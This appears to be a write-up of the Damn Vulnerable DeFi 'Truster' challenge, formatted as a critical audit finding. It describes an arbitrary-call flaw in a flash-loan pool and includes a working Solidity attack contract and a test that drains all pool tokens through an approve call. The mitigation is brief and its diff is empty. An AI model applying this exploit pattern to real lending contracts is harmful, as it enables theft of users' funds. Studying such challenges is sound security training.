## Critical Severity Issues

### [C-1] Arbitrary External Call Injection `TrusterLenderPool::flashLoan`

**Description**: The `TrusterLenderPool` protocol provides flash loans to any one. The malicious user comes and takes the advantage of `target.functionCall(data)` and pass the data which under the hood calls the approve selector of the target token and flew away all the `DVT` tokens.

```javascript
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external nonReentrant returns (bool) {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);

@>      target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
```

**Impact**: Malicious user takes the advantage of external call and make a call data which under the hood approve all the target tokens of `TrusterLenderPool`.

Attack Contract:

```javascript

 {DamnValuableToken} from "../src/DamnValuableToken.sol";

contract Target {

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    address public attacker;

    constructor(
        DamnValuableToken _token,
        TrusterLenderPool _pool,
        address _attacker
    ) {
        token = _token;
        pool = _pool;
        attacker = _attacker;
    }

    function attack() external {
     uint256 poolBalance = token.balanceOf(address(pool)); // 1 million DVTs
      
      pool.flashLoan( 0, address(this),address(token),
@>           abi.encodeWithSelector( token.approve.selector, address(this),  poolBalance)
        );

        // Drain the funds
        token.transferFrom(address(pool), attacker, poolBalance);
    }
}

```

**Proof of Concept**:

1. Attacker pass call data.
2. Which is `approve` selector for his self with all pool token.
3. Call flashLoan with `0` flash loan.
4. Transfer all the funds from pool
5. And Pool loss all funds

**Proof of Code**:

```javascript
function testStealAllPoolFunds() public {
        console2.log( "Pool balance before : ", token.balanceOf(address(trusterLenderPool))); // 1000000000000000000000000
        console2.log( "Attacker balance before : ", token.balanceOf(target.attacker())); // 0

        target.attack(); // attack

        console2.log("Pool balance After : ", token.balanceOf(address(trusterLenderPool))); // 0
        console2.log("Target balance After : ", token.balanceOf(target.attacker())); // 1000000000000000000000000
    }
```

**Recommended Mitigation**: Consider limiting the target calling contracts function selectors , that a specific call data can be passed only.

```diff

```
